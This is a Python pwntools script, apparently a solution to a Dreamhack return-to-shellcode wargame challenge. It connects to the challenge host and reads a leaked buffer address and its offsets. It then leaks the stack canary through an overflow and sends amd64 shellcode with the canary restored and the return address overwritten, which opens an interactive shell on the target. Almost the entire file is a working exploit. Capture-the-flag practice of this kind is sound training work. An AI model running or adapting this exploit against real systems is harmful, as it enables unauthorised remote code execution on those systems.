#!/usr/bin/env python3
# Name: r2s.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = remote("host1.dreamhack.games", 11485)
context.arch = 'amd64'

# [1] Get information about buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)

# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
